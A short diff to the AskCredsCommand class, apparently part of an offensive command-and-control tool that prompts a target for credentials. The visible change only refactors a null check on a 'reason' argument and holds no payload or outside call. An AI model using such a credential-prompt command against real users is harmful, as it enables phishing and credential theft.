@@ -113,7 +113,8 @@ class AskCredsCommand(CommandBase):
                                     delete_after_fetch=True)  
         
         encoded_args = ""
-        if(task.args.get_arg("reason") is not None):
+        reason = task.args.get_arg("reason")
+        if reason:
             # Initialize our Argument list object
             OfArgs = []
             
